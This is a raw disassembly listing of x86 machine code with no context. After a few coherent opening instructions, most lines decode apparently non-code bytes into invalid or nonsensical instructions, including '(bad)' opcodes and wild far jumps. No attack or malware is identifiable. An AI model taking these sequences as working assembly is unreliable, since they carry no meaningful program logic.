  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs (bad) es:[edi+eiz*1-0x3d716c1b]
  41e9a0:	jge    0x41ea1c
  41e9a2:	or     bl,BYTE PTR [edi+0x7a]
  41e9a5:	jp     0x41e97e
  41e9a7:	sbb    edi,edi
  41e9a9:	xchg   esp,eax
  41e9aa:	dec    esi
  41e9ab:	call   0x1009:0xe67e301e
  41e9b2:	stos   DWORD PTR es:[edi],eax
  41e9b3:	add    BYTE PTR ds:0x2039c984,dh
  41e9b9:	or     al,0x80
  41e9bb:	xor    edx,0xffffffbd
  41e9be:	mov    bl,0x74
  41e9c0:	pop    ecx
  41e9c1:	adc    bl,BYTE PTR [ebx+0x2c3919f2]
  41e9c7:	pop    ecx
  41e9c8:	mov    fs,WORD PTR [ebx-0x30b0b12d]
  41e9ce:	mov    ds:0xbad30437,eax
  41e9d3:	aaa    
  41e9d4:	fucomip st,st(3)
  41e9d6:	idiv   dl
  41e9d8:	mov    edx,0xbdbad319
  41e9dd:	add    cl,BYTE PTR [ecx]
  41e9df:	jmp    0x41e9a8
  41e9e1:	mov    ebp,0xc1956d31
  41e9e6:	or     eax,0x6de7443c
  41e9eb:	lods   al,BYTE PTR ds:[esi]
  41e9ec:	inc    esp
  41e9ed:	icebp  
  41e9ee:	adc    al,0xb
  41e9f0:	sbb    ecx,esi
  41e9f2:	jg     0x41ea01
  41e9f4:	xlat   BYTE PTR ds:[ebx]
  41e9f5:	or     BYTE PTR [edi],bh
  41e9f7:	mov    edx,0xcbf376b7
  41e9fc:	jno    0x41ea3a
  41e9fe:	jno    0x41ea14
  41ea00:	int    0x6
  41ea02:	imul   esi,DWORD PTR [eax],0x9ae281d
  41ea08:	mov    gs,WORD PTR [esi-0x58]
  41ea0b:	dec    edx
  41ea0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea0d:	add    al,0x9e
  41ea0f:	icebp  
  41ea10:	xchg   ebx,eax
  41ea11:	push   es
  41ea12:	jbe    0x41e9cc
  41ea14:	add    esi,DWORD PTR [ebx-0x3a]
  41ea17:	iret   
  41ea18:	add    BYTE PTR [edx],dl
  41ea1a:	mov    ebp,0x6656c0c8
  41ea1f:	mov    edi,0xd639b2f4
  41ea24:	mov    ds:0xc1c9f913,al
  41ea29:	cld    
  41ea2a:	pop    es
  41ea2b:	push   eax
  41ea2c:	mov    eax,ds:0x4b2b51a5
  41ea31:	sbb    ecx,edx
  41ea33:	xlat   BYTE PTR ds:[ebx]
  41ea34:	mov    bh,BYTE PTR ds:0xd12c7097
  41ea3a:	fs mov edi,0x4d9afb65
  41ea40:	adc    esp,DWORD PTR [edi]
  41ea42:	mov    ds:0x5443a9fe,eax
  41ea47:	dec    edx
  41ea48:	lods   eax,DWORD PTR ds:[esi]
  41ea49:	xor    ch,BYTE PTR [ebx-0x73]
  41ea4c:	bound  edx,QWORD PTR [eax+0x3f]
  41ea4f:	out    dx,al
  41ea50:	push   ds
  41ea51:	cmp    al,bh
  41ea53:	rcr    ch,cl
  41ea55:	ds retf 0x39
  41ea59:	inc    ebp
  41ea5a:	and    al,0x92
  41ea5c:	cld    
  41ea5d:	jno    0x41ea38
  41ea5f:	fwait
  41ea60:	dec    edi
  41ea61:	cmc    
  41ea62:	ror    DWORD PTR [eax],1
  41ea64:	lahf   
  41ea65:	push   0x5c
  41ea67:	icebp  
  41ea68:	cli    
  41ea69:	xor    al,BYTE PTR [di]
  41ea6c:	xchg   esi,eax
  41ea6d:	int3   
  41ea6e:	jp     0x41ea2f
  41ea70:	dec    eax
  41ea71:	shr    bh,cl
  41ea73:	repz mov esi,0x4fcb33ea
  41ea79:	mov    esi,0xbf72e256
  41ea7e:	ins    DWORD PTR es:[edi],dx
  41ea7f:	sbb    ecx,DWORD PTR [ebx-0x13e4f575]
  41ea85:	int    0xdc
  41ea87:	cmc    
  41ea88:	cmp    eax,0x79372207
  41ea8d:	das    
  41ea8e:	fimul  WORD PTR [ebp+0x38]
  41ea91:	mov    esi,0x6db1549b
  41ea96:	jmp    0x4bb08593
  41ea9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea9c:	xlat   BYTE PTR ds:[ebx]
  41ea9d:	cdq    
  41ea9e:	mov    ecx,0xe080b27a
  41eaa3:	stos   BYTE PTR es:[edi],al
  41eaa4:	adc    al,0x63
  41eaa6:	mov    edx,0x790b2487
  41eaab:	mov    WORD PTR [ebp+eiz*4-0x71],?
  41eaaf:	in     eax,0x24
  41eab1:	xchg   edx,eax
  41eab2:	fisub  DWORD PTR [ecx+ebx*4-0x4f]
  41eab6:	pusha  
  41eab7:	jle    0x41eb1a
  41eab9:	cmp    bh,bh
  41eabb:	mov    esi,0x826278bb
  41eac0:	mov    edx,0x58728fdb
  41eac5:	mov    DWORD PTR [eax-0x3a],0xa042f3d0
  41eacc:	lods   al,BYTE PTR ds:[esi]
  41eacd:	pop    eax
  41eace:	retf   
  41eacf:	aad    0xda
  41ead1:	jl     0x41ea5a
  41ead3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ead4:	cmp    BYTE PTR ss:[esi],bh
  41ead7:	rcl    BYTE PTR [eax],cl
  41ead9:	add    eax,0x70237d5
  41eade:	mov    WORD PTR [edi],ss
  41eae0:	add    BYTE PTR [esi+ecx*4],cl
  41eae3:	in     eax,dx
  41eae4:	ss pop ecx
  41eae6:	hlt    
  41eae7:	xchg   edi,eax
  41eae8:	sar    BYTE PTR [ebx],cl
  41eaea:	call   0xdf10:0x35b2be67
  41eaf1:	or     DWORD PTR [ebx+0x300dcf51],ebx
  41eaf7:	sub    dh,BYTE PTR [ecx-0x1f]
  41eafa:	inc    esp
  41eafb:	not    DWORD PTR [edx+0x41857ee7]
  41eb01:	mov    dh,0xec
  41eb03:	call   0x55eb:0x5e11eb19
  41eb0a:	ins    DWORD PTR es:[edi],dx
  41eb0b:	loope  0x41eb24
  41eb0d:	lds    ebp,FWORD PTR [eax+0x54]
  41eb10:	les    esi,FWORD PTR [edx+0x5c5d1577]
  41eb16:	nop
  41eb17:	pop    ebx
  41eb18:	or     eax,0x14102883
  41eb1d:	adc    BYTE PTR ds:0x24be4ae9,al
  41eb23:	mov    ebx,0x5b52eb9d
  41eb28:	imul   ecx,ecx,0xff9eee82
  41eb2e:	xchg   esp,eax
  41eb2f:	inc    eax
  41eb30:	fstp   DWORD PTR [edi+0x5a1ed752]
  41eb36:	xor    bh,dl
  41eb38:	pop    ecx
  41eb39:	jns    0x41eac0
  41eb3b:	ror    edi,0x9e
  41eb3e:	push   es
  41eb3f:	xor    ebp,DWORD PTR [edx]
  41eb41:	xchg   ecx,eax
  41eb42:	loopne 0x41eacc
  41eb44:	push   esi
  41eb45:	(bad)  
  41eb46:	jno    0x41eb20
  41eb48:	add    dl,BYTE PTR [ecx]
  41eb4a:	add    al,0x40
  41eb4c:	loope  0x41eb30
  41eb4e:	jmp    0xb11bec1
  41eb53:	fmul   QWORD PTR [esi]
  41eb55:	mov    ds:0xa250eb99,eax
  41eb5a:	mov    DWORD PTR [edx+0x71],ebx
  41eb5d:	bound  edi,QWORD PTR [eax]
  41eb5f:	pop    ebx
  41eb60:	lods   eax,DWORD PTR ds:[esi]
  41eb61:	inc    esi
  41eb62:	add    dh,0xd7
  41eb65:	jbe    0x41eb28
  41eb67:	jb     0x41eb5f
  41eb69:	xchg   ebp,eax
  41eb6a:	xor    al,0xd5
  41eb6c:	xor    BYTE PTR [edi-0x7e],ch
  41eb6f:	xor    BYTE PTR [eax],bl
  41eb71:	je     0x41eb52
  41eb73:	jecxz  0x41ebbb
  41eb75:	aaa    
  41eb76:	xchg   esi,eax
  41eb77:	sahf   
  41eb78:	retf   0x5e29
  41eb7b:	call   0xb0c0:0x3a7fce6b
  41eb82:	repz and eax,0x2e9e05a6
  41eb88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb89:	push   0xfffffff0
  41eb8b:	jmp    0x925261f1
  41eb90:	dec    esi
  41eb91:	call   0xee89:0xb31aa981
  41eb98:	push   es
  41eb99:	lods   eax,DWORD PTR ds:[esi]
  41eb9a:	in     eax,dx
  41eb9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb9c:	jle    0x41ebcd
  41eb9e:	sar    DWORD PTR [ecx+0x14],0x92
  41eba2:	test   DWORD PTR [eax],0x9a9dcd83
  41eba8:	mov    ah,0xde
  41ebaa:	lea    ebp,ds:0x17e08680
  41ebb0:	mov    ds:0xa9c56744,eax
  41ebb5:	aaa    
  41ebb6:	sbb    DWORD PTR [edx-0x518e5210],0xffffffa2
  41ebbd:	leave  
  41ebbe:	out    dx,eax
  41ebbf:	sub    edi,DWORD PTR [esi-0x24]
  41ebc2:	and    al,BYTE PTR ds:0xf54cc021
  41ebc8:	ret    
  41ebc9:	sar    eax,cl
  41ebcb:	cmc    
  41ebcc:	push   edi
  41ebcd:	lds    ecx,FWORD PTR [ebx]
  41ebcf:	cld    
  41ebd0:	das    
  41ebd1:	in     al,0x82
  41ebd3:	and    ecx,eax
  41ebd5:	fisttp WORD PTR [ecx-0x12]
  41ebd8:	push   edi
  41ebd9:	or     eax,0xfa1b2bbe
  41ebde:	scas   eax,DWORD PTR es:[edi]
  41ebdf:	xchg   edi,eax
  41ebe0:	or     eax,0x9f3487f8
  41ebe5:	ins    DWORD PTR es:[edi],dx
  41ebe6:	mov    es,WORD PTR [esi+edi*1]
  41ebe9:	std    
  41ebea:	cli    
  41ebeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebec:	int    0xd8
  41ebee:	xor    eax,0xa52b5ce4
  41ebf3:	out    dx,al
  41ebf4:	aam    0xb3
  41ebf6:	cs nop
  41ebf8:	pushf  
  41ebf9:	clc    
  41ebfa:	ret    
  41ebfb:	retf   
  41ebfc:	js     0x41ebbc
  41ebfe:	out    dx,eax
  41ebff:	call   0xee0d:0x841b5a72
  41ec06:	or     ebp,DWORD PTR [ecx]
  41ec08:	iret   
  41ec09:	jns    0x41ec7f
  41ec0b:	loope  0x41ebf5
  41ec0d:	xchg   ebx,eax
  41ec0e:	scas   eax,DWORD PTR es:[edi]
  41ec0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec10:	cmc    
  41ec11:	rcr    dl,0x58
  41ec14:	jmp    0xa1b2:0xb7f5c776
  41ec1b:	inc    edx
  41ec1c:	xchg   BYTE PTR [ebp-0x2b],ch
  41ec1f:	sbb    BYTE PTR [ecx+0x2b8fbf70],dl
  41ec25:	and    al,0x17
  41ec27:	push   edi
  41ec28:	mov    eax,0xca811786
  41ec2d:	sahf   
  41ec2e:	bound  edx,QWORD PTR [esp+ecx*8+0x45]
  41ec32:	xchg   edi,eax
  41ec33:	pusha  
  41ec34:	xchg   ecx,eax
  41ec35:	stc    
  41ec36:	repz xor al,dh
  41ec39:	cmp    al,0xd1
  41ec3b:	pushf  
  41ec3c:	xchg   ebp,eax
  41ec3d:	loopne 0x41ec7f
  41ec3f:	sub    al,0x40
  41ec41:	push   eax
  41ec42:	popa   
  41ec43:	xchg   ebp,eax
  41ec44:	clc    
  41ec45:	mov    bl,0x87
  41ec47:	or     DWORD PTR [edx+0x59],esi
  41ec4a:	adc    ebx,DWORD PTR [ebx+0x3cfd841c]
  41ec50:	xlat   BYTE PTR ds:[ebx]
  41ec51:	stos   DWORD PTR es:[edi],eax
  41ec52:	push   cs
  41ec53:	mov    al,0xc5
  41ec55:	mov    bh,0x91
  41ec57:	(bad)  
  41ec58:	mov    ebp,DWORD PTR [eax+ebx*1+0x75bbfa59]
  41ec5f:	rol    BYTE PTR [edx+0x76],cl
  41ec62:	jae    0x41ecb7
  41ec64:	and    ecx,ebx
  41ec66:	shl    DWORD PTR [eax+0x7183b5e3],0x9b
  41ec6d:	sbb    dl,al
  41ec6f:	fcmovnb st,st(6)
  41ec71:	or     bl,bl
  41ec73:	(bad)  
  41ec74:	or     BYTE PTR [ebx+0x31],dl
  41ec77:	call   0x7639:0xb4b7f501
  41ec7e:	inc    esi
  41ec7f:	pushf  
  41ec80:	daa    
  41ec81:	and    bl,dl
  41ec83:	adc    bl,bh
  41ec85:	out    0x8f,al
  41ec87:	sbb    dh,dl
  41ec89:	dec    eax
  41ec8a:	fbstp  TBYTE PTR [edi+0x45]
  41ec8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec8e:	lods   eax,DWORD PTR ds:[esi]
  41ec8f:	xchg   esp,eax
  41ec90:	xor    BYTE PTR ss:[edx],bl
  41ec93:	fiadd  DWORD PTR [edx-0x37911806]
  41ec99:	repnz adc al,0x66
  41ec9c:	retf   
  41ec9d:	dec    ebx
  41ec9e:	in     eax,dx
  41ec9f:	(bad)  
  41eca0:	outs   dx,DWORD PTR ds:[esi]
  41eca1:	adc    bl,BYTE PTR [esi]
  41eca3:	xchg   esp,eax
  41eca4:	loope  0x41ec58
  41eca6:	add    esp,DWORD PTR [eiz*1+0x71f8ef6d]
  41ecad:	jg     0x41ec88
  41ecaf:	sub    eax,DWORD PTR [ecx-0x10]
  41ecb2:	xor    dh,dh
  41ecb4:	dec    edx
  41ecb5:	js     0x41ec61
  41ecb7:	std    
  41ecb8:	call   0x9a7c46b8
  41ecbd:	in     al,dx
  41ecbe:	push   ss
  41ecbf:	lahf   
  41ecc0:	dec    esp
  41ecc1:	lea    esp,[ebx+edi*1-0x63]
  41ecc5:	dec    ebx
  41ecc6:	or     bl,cl
  41ecc8:	(bad)  
  41ecc9:	(bad)  
  41ecca:	pop    ebp
  41eccb:	outs   dx,BYTE PTR ds:[esi]
  41eccc:	adc    al,0x9f
  41ecce:	popa   
  41eccf:	push   ds
  41ecd0:	jo     0x41ecee
  41ecd2:	xchg   edx,eax
  41ecd3:	lahf   
  41ecd4:	pop    esp
  41ecd5:	mov    al,ds:0xbc0b0a56
  41ecda:	cwde   
  41ecdb:	scas   al,BYTE PTR es:[edi]
  41ecdc:	jl     0x41ec9a
  41ecde:	sbb    eax,0xfa6b99f
  41ece3:	out    0x10,eax
  41ece5:	lds    ecx,FWORD PTR [ecx]
  41ece7:	stos   BYTE PTR es:[edi],al
  41ece8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ece9:	inc    eax
  41ecea:	sbb    al,0xae
  41ecec:	ja     0x41ed61
  41ecee:	out    dx,eax
  41ecef:	xchg   ebp,eax
  41ecf0:	jge    0x41ece7
  41ecf2:	add    eax,0x10a4a189
  41ecf7:	jp     0x41ed17
  41ecf9:	loopne 0x41ed00
  41ecfb:	call   DWORD PTR [edx+0x3a]
  41ecfe:	dec    eax
  41ecff:	stc    
  41ed00:	outs   dx,DWORD PTR ds:[esi]
  41ed01:	cmc    
  41ed02:	sbb    edi,ebp
  41ed04:	dec    esi
  41ed05:	loopne 0x41ed6e
  41ed07:	sar    eax,1
  41ed09:	aad    0x1c
  41ed0b:	add    eax,0x89b8e883
  41ed10:	loop   0x41ecb7
  41ed12:	sbb    ch,BYTE PTR [edi]
  41ed14:	xchg   edx,eax
  41ed15:	pop    ds
  41ed16:	xchg   ecx,ebp
  41ed18:	xor    dl,BYTE PTR ds:0x98c67026
  41ed1e:	sbb    ecx,DWORD PTR [ecx]
  41ed20:	arpl   WORD PTR [edi],ax
  41ed22:	xor    al,BYTE PTR [edi-0x37]
  41ed25:	push   ebp
  41ed26:	in     al,0x88
  41ed28:	fwait
  41ed29:	xchg   ebx,eax
  41ed2a:	mov    ds:0xf4387b65,al
  41ed2f:	dec    eax
  41ed30:	cmp    al,0x8b
  41ed32:	cmp    ah,ah
  41ed34:	mov    edx,0x13900f69
  41ed39:	or     DWORD PTR [esi+0x9f42db1],ebx
  41ed3f:	xchg   BYTE PTR [ecx],bl
  41ed41:	(bad)  
  41ed42:	retf   0xc147
  41ed45:	sbb    eax,0xfa023e50
  41ed4a:	popf   
  41ed4b:	xor    ah,BYTE PTR [ecx-0x22]
  41ed4e:	aaa    
  41ed4f:	loop   0x41eda3
  41ed51:	fst    QWORD PTR [ebx+0x13ccd172]
  41ed57:	fst    QWORD PTR [edx+0x40]
  41ed5a:	imul   edx,DWORD PTR [edx+0x4979d27b],0x30
  41ed61:	sahf   
  41ed62:	mov    ds:0xfc8ad0a5,al
  41ed67:	jg     0x41edcd
  41ed69:	in     eax,0x4
  41ed6b:	gs ret 0xca59
  41ed6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed70:	(bad)
  41ed73:	test   al,0x6f
  41ed75:	xor    BYTE PTR [esi],bl
  41ed77:	les    edi,FWORD PTR [edi-0x2af294d6]
  41ed7d:	add    ebx,DWORD PTR [esi-0x3d]
  41ed80:	sub    BYTE PTR [eax+0xe],al
  41ed83:	mov    dl,0x4d
  41ed85:	ret    
  41ed86:	mov    dh,BYTE PTR [eax+ebp*4-0x45521059]
  41ed8d:	ret    
  41ed8e:	add    al,0xdc
  41ed90:	das    
  41ed91:	pop    esp
  41ed92:	sub    DWORD PTR [ecx+0x78730a0d],edx
  41ed98:	hlt    
  41ed99:	xchg   edx,eax
  41ed9a:	ror    DWORD PTR [ebx],0xc0
  41ed9d:	outs   dx,BYTE PTR ds:[esi]
  41ed9e:	sub    DWORD PTR [ebx-0x78],esp
  41eda1:	gs fcompp 
  41eda4:	mov    es,WORD PTR fs:[esi-0x5222da8e]
  41edab:	lds    eax,FWORD PTR [ecx]
  41edad:	dec    esp
  41edae:	test   BYTE PTR [esi+esi*8],bl
  41edb1:	add    eax,0x727d4b3a
  41edb6:	cmp    eax,0xed296951
  41edbb:	cs rol ch,cl
  41edbe:	je     0x41ee3e
  41edc0:	loope  0x41eda9
  41edc2:	pop    ebp
  41edc3:	aad    0x5c
  41edc5:	sbb    al,0x4c
  41edc7:	loop   0x41ed7d
  41edc9:	les    ebp,FWORD PTR [eax-0x36]
  41edcc:	les    ebx,FWORD PTR [edx+0x25]
  41edcf:	push   ebp
  41edd0:	push   ss
  41edd1:	dec    ebp
  41edd2:	add    eax,0xebf50ba
  41edd7:	lods   al,BYTE PTR ds:[esi]
  41edd8:	retf   
  41edd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edda:	call   DWORD PTR ds:0xbd166490
  41ede0:	xlat   BYTE PTR ds:[ebx]
  41ede1:	cdq    
  41ede2:	mov    edi,0xb3ba65c3
  41ede7:	cli    
  41ede8:	scas   al,BYTE PTR es:[edi]
  41ede9:	shr    DWORD PTR ds:0x6383943e,1
  41edef:	xchg   esp,eax
  41edf0:	jno    0x41ee5f
  41edf2:	ret    0x898b
  41edf5:	sub    BYTE PTR ds:0xa2ec2b9f,bl
  41edfb:	jge    0x41ee33
  41edfd:	test   eax,0xf7c99388
  41ee02:	(bad)  
  41ee03:	in     eax,dx
  41ee04:	cli    
  41ee05:	sbb    BYTE PTR [esi-0x57666aa3],cl
  41ee0b:	dec    ebx
  41ee0c:	xchg   esp,eax
  41ee0d:	xchg   BYTE PTR [esi],dh
  41ee0f:	retf   0x1142
  41ee12:	push   ecx
  41ee13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee14:	ret    
  41ee15:	fcmovne st,st(6)
  41ee17:	mov    ecx,0xad376aad
  41ee1c:	test   ebp,edx
  41ee1e:	loop   0x41ee5f
  41ee20:	mov    esi,0xdb58613b
  41ee25:	push   0xffffffcc
  41ee27:	mov    edx,0x719a244c
  41ee2c:	pop    esi
  41ee2d:	or     eax,0x1a33e856
  41ee32:	xor    al,0xfb
  41ee34:	sar    BYTE PTR [edi+0x3e11501a],1
  41ee3a:	(bad)  
  41ee3b:	cmp    BYTE PTR [edx+0x7e50baed],al
  41ee41:	sti    
  41ee42:	xchg   ebx,ecx
  41ee44:	pop    eax
  41ee45:	mov    edi,0xe5e08b0d
  41ee4a:	mul    DWORD PTR [ebx+0x558927d]
  41ee50:	and    DWORD PTR [edx],ebp
  41ee52:	pop    ds
  41ee53:	lahf   
  41ee54:	mov    edi,0xa83d9c03
  41ee59:	je     0x41ede5
  41ee5b:	cmp    DWORD PTR [ebp+0x43],ebp
  41ee5e:	retf   
  41ee5f:	sub    ch,ch
  41ee61:	push   0xbbe196c3
  41ee66:	(bad)  
  41ee67:	cdq    
  41ee68:	arpl   WORD PTR ds:0x238ec2a6,sp
  41ee6e:	cld    
  41ee6f:	popf   
  41ee70:	dec    ebx
  41ee71:	mov    esp,0x5957da0f
  41ee76:	xchg   edi,eax
  41ee77:	inc    ebp
  41ee78:	jg     0x41ee3a
  41ee7a:	repnz push 0x72
  41ee7d:	dec    esp
  41ee7e:	and    DWORD PTR [edx],ebp
  41ee80:	rol    ch,1
  41ee82:	mov    bl,BYTE PTR [edx+0x74]
  41ee85:	fiadd  DWORD PTR [ebx-0x4f]
  41ee88:	xlat   BYTE PTR ds:[ebx]
  41ee89:	popa   
  41ee8a:	scas   al,BYTE PTR es:[edi]
  41ee8b:	mov    ds:0xe33406fb,eax
  41ee90:	mov    ebp,0x95623a13
  41ee95:	xlat   BYTE PTR ds:[ebx]
  41ee96:	sub    eax,0x53ce54c2
  41ee9b:	(bad)  
  41ee9c:	in     al,dx
  41ee9d:	jnp    0x41ef14
  41ee9f:	stos   BYTE PTR es:[edi],al
  41eea0:	fidiv  WORD PTR [edi-0x12]
  41eea3:	fld    DWORD PTR [ecx+esi*1-0x15]
  41eea7:	and    ch,BYTE PTR [ebp+0x26]
  41eeaa:	movmskps edx,xmm2
  41eead:	out    dx,eax
  41eeae:	push   es
  41eeaf:	sar    BYTE PTR [esi],0xd9
  41eeb2:	pop    ecx
  41eeb3:	or     esi,DWORD PTR [esi]
  41eeb5:	(bad)  
  41eeb6:	adc    al,0xa2
  41eeb8:	icebp  
  41eeb9:	xor    cl,ah
  41eebb:	div    ecx
  41eebd:	mov    dl,0xdd
  41eebf:	xchg   edx,eax
  41eec0:	cmp    eax,0xa45f492b
  41eec5:	push   0x43
  41eec7:	in     al,0x1b
  41eec9:	stc    
  41eeca:	or     ah,BYTE PTR [edx-0x12]
  41eecd:	ja     0x41ee51
  41eecf:	inc    DWORD PTR [eax+0x6c]
  41eed2:	in     al,dx
  41eed3:	push   ebp
  41eed4:	sub    bh,BYTE PTR [ebx+0x7cc8359c]
  41eeda:	inc    edx
  41eedb:	ret    
  41eedc:	or     al,BYTE PTR [esi-0x57c06530]
  41eee2:	mov    edx,0x77787fb
  41eee7:	lods   al,BYTE PTR ds:[esi]
  41eee8:	test   BYTE PTR ds:0x9a6407c4,dl
  41eeee:	retf   
  41eeef:	imul   esp,DWORD PTR [ebx],0x7e
  41eef2:	arpl   WORD PTR [ecx-0x1c],bx
  41eef5:	or     bl,ch
  41eef7:	adc    BYTE PTR [ebp+0x7e7399c6],0xc3
  41eefe:	or     esi,DWORD PTR [esi]
  41ef00:	retf   
  41ef01:	and    BYTE PTR [ecx],bl
  41ef03:	cmc    
  41ef04:	adc    al,0x1d
  41ef06:	pop    esi
  41ef07:	icebp  
  41ef08:	imul   ebx,DWORD PTR [edi],0x16391063
  41ef0e:	nop
  41ef0f:	test   bl,bh
  41ef11:	inc    ebx
  41ef12:	sub    BYTE PTR [ecx-0x716c0bf7],ah
  41ef18:	mov    gs,WORD PTR [edi-0x77bee761]
  41ef1e:	pop    ebx
  41ef1f:	xchg   ebp,eax
  41ef20:	sbb    DWORD PTR [edi],eax
  41ef22:	mov    ah,0xac
  41ef24:	push   es
  41ef25:	xor    DWORD PTR [esi+0x5dc07774],ebx
  41ef2b:	cli    
  41ef2c:	arpl   cx,si
  41ef2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef2f:	sub    eax,0x902ad52
  41ef34:	inc    eax
  41ef35:	shr    esp,1
  41ef37:	sbb    eax,0xbeabc7ad
  41ef3c:	pop    eax
  41ef3d:	sbb    BYTE PTR [edx],dh
  41ef3f:	in     eax,dx
  41ef40:	ins    BYTE PTR es:[edi],dx
  41ef41:	fnstsw ax
  41ef43:	xchg   edx,eax
  41ef44:	pop    ss
  41ef45:	mov    gs,WORD PTR [ebx-0x677c691b]
  41ef4b:	mov    ch,0x7c
  41ef4d:	dec    ebp
  41ef4e:	pop    ebp
  41ef4f:	daa    
  41ef50:	mov    DWORD PTR [edi-0xf],esi
  41ef53:	jne    0x41efba
  41ef55:	hlt    
  41ef56:	daa    
  41ef57:	rol    esp,cl
  41ef59:	jecxz  0x41ef3b
  41ef5b:	push   ecx
  41ef5c:	push   edx
  41ef5d:	bound  sp,DWORD PTR [ecx-0x79]
  41ef61:	test   eax,0x989f64a4
  41ef66:	hlt    
  41ef67:	js     0x41efb7
  41ef69:	push   esi
  41ef6a:	retf   0x96a
  41ef6d:	ss dec esi
  41ef6f:	out    0xfe,eax
  41ef71:	mov    bl,0x1d
  41ef73:	pop    ecx
  41ef74:	cmp    dl,bl
  41ef76:	js     0x41ef27
  41ef78:	inc    ebx
  41ef79:	arpl   WORD PTR [edx-0x30256e46],sp
  41ef7f:	(bad)  
  41ef80:	stc    
  41ef81:	and    al,0x8f
  41ef83:	and    BYTE PTR [edx+0x10],dh
  41ef86:	scas   eax,DWORD PTR es:[edi]
  41ef87:	sub    dh,BYTE PTR [ebx-0x361d4e7d]
  41ef8d:	adc    BYTE PTR [eax],dl
  41ef8f:	ins    BYTE PTR es:[edi],dx
  41ef90:	ficomp WORD PTR [ebx+0x59]
  41ef93:	or     al,dl
  41ef95:	les    ebp,FWORD PTR [edx]
  41ef97:	jns    0x41ef2c
  41ef99:	pop    ebp
  41ef9a:	repz pop ds
  41ef9c:	ja     0x41ef41
  41ef9e:	in     eax,0xe8
  41efa0:	maskmovq mm1,mm7
  41efa3:	sar    BYTE PTR [ecx-0x4e],1
  41efa6:	stos   BYTE PTR es:[edi],al
  41efa7:	rcl    DWORD PTR [edx+0x4b3a92d3],0xb1
  41efae:	cwde   
  41efaf:	lods   eax,DWORD PTR ds:[esi]
  41efb0:	enter  0xe949,0xac
  41efb4:	xchg   esp,eax
  41efb5:	jnp    0x41f016
  41efb7:	jne    0x41efd5
  41efb9:	jp     0x41efb8
  41efbb:	push   ss
  41efbc:	aas    
  41efbd:	mov    edi,0x8666a39a
  41efc2:	leave  
  41efc3:	out    0x1d,al
  41efc5:	add    DWORD PTR [ebx+eax*4],edx
  41efc8:	out    0x19,eax
  41efca:	inc    BYTE PTR [esi]
  41efcc:	ret    0xe752
  41efcf:	or     bl,BYTE PTR [ebx+0x11]
  41efd2:	out    0xcc,eax
  41efd4:	push   ebp
  41efd5:	dec    BYTE PTR [ebx+0x14]
  41efd8:	bound  esp,QWORD PTR [eax]
  41efda:	retf   
  41efdb:	addr16 jge 0x41f013
  41efde:	lods   al,BYTE PTR ds:[esi]
  41efdf:	(bad)  
  41efe0:	outs   dx,DWORD PTR ds:[esi]
  41efe1:	cmp    bl,BYTE PTR [esi-0x6a]
  41efe4:	out    0x2,al
  41efe6:	jmp    0x41efb9
  41efe8:	mov    bh,0x21
  41efea:	or     edi,edi
  41efec:	push   eax
  41efed:	mov    WORD PTR [edx],?
  41efef:	push   ss
  41eff0:	push   0xfb5b0ae6
  41eff5:	in     al,0x9a
  41eff7:	sbb    ah,BYTE PTR [edx+0x27]
  41effa:	dec    eax
  41effb:	inc    edx
  41effc:	dec    esi
  41effd:	out    0xc8,al
  41efff:	cmp    DWORD PTR [edx+0x16],ebx
  41f002:	pop    ecx
  41f003:	mov    ah,0x57
  41f005:	fcomp  QWORD PTR [ecx+0x74]
  41f008:	inc    esp
  41f009:	enter  0xc3d5,0x38
  41f00d:	jmp    0xd1bda5cb
  41f012:	data16 mov dh,BYTE PTR [edi+ebx*2+0x58]
  41f017:	xchg   esi,eax
  41f018:	pop    edx
  41f019:	into   
  41f01a:	pop    ebp
  41f01b:	mov    ds:0xeaeb87ff,al
  41f020:	dec    edi
  41f021:	scas   eax,DWORD PTR es:[edi]
  41f022:	mov    ch,0x41
  41f025:	loope  0x41f02e
  41f027:	test   al,0x77
  41f029:	lea    ebp,[edi+0x73]
  41f02c:	mov    ebp,0xd487d6b2
  41f031:	push   es
  41f032:	push   ebp
  41f033:	icebp  
  41f034:	jo     0x41f090
  41f036:	dec    ecx
  41f037:	inc    edx
  41f038:	cmp    eax,0x62d9480e
  41f03d:	cli    
  41f03e:	lds    esp,FWORD PTR [ecx]
  41f040:	iret   
  41f041:	pause  
  41f043:	cmp    al,0xde
  41f045:	repnz or DWORD PTR [ebx+0x7b882d72],0x55
  41f04d:	jne    0x41efea
  41f04f:	xchg   BYTE PTR [esi-0x62],cl
  41f052:	adc    dh,ah
  41f054:	sub    edi,edx
  41f056:	xor    bh,ah
  41f058:	and    DWORD PTR [bp+si-0x62ee],esi
  41f05d:	rcr    ebp,0x2e
  41f060:	(bad)  
  41f061:	rol    DWORD PTR [eax+eiz*2-0x7fb3c6c],cl
  41f068:	stos   BYTE PTR es:[edi],al
  41f069:	inc    eax
  41f06a:	xor    al,0x46
  41f06d:	sub    eax,0xd94483d0
  41f072:	pop    eax
  41f073:	inc    ebx
  41f074:	arpl   WORD PTR [ebx+0x78],dx
  41f077:	sbb    BYTE PTR [edx],bh
  41f079:	push   ds
  41f07a:	repz dec esp
  41f07c:	in     al,0xec
  41f07e:	dec    edi
  41f07f:	in     eax,0x3a
  41f081:	cld    
  41f082:	fwait
  41f083:	cdq    
